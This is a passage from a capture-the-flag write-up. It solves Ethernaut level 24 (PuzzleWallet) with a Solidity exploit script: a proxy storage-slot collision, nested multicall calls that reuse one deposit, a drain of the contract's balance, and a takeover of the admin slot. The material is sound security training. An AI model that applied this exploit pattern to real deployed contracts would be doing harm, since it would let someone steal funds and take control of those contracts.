### Ethernaut 24

Although the `multicall` function restricts calling `deposit` more than 1 time in one call, we can batch `multicall` itself in a multicall and deposit multiple times that way

```solidity
vm.startPrank(player);

level.proposeNewAdmin(player); // rewrite slot 0 on puzzlewallet
puzzleWallet.addToWhitelist(player);

bytes[] memory deposit = new bytes[](1);
deposit[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); // deposit in a batch

bytes[] memory batch = new bytes[](2);
batch[0] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, deposit);
batch[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, deposit); // 2 batched multicalls with 1 deposit

puzzleWallet.multicall{value: 0.001 ether}(batch);

puzzleWallet.execute(player, 0.002 ether, "");

puzzleWallet.setMaxBalance(uint256(player));

vm.stopPrank();

assert(level.admin() == player);
```

### Ethernaut 25

